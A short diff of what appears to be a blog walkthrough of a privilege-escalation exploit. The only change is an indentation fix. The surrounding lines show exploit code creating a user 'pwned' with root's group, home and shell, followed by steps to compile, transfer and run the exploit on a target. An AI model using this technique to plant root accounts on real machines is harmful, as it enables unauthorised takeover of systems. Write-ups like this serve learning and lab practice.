@@ -288,7 +288,7 @@ Make sure you edit line 131+ so that you make your own user:
   user.group_id = 0;
   user.info = "pwned";
   user.home_dir = "/root";
-user.shell = "/bin/bash";
+  user.shell = "/bin/bash";
 {% endhighlight %}
 
 After that just compile the exploit with required flags, transfer it onto the machine (or compile it there directly) and run it. If all goes smoothly the exploit should finish without any issues. 
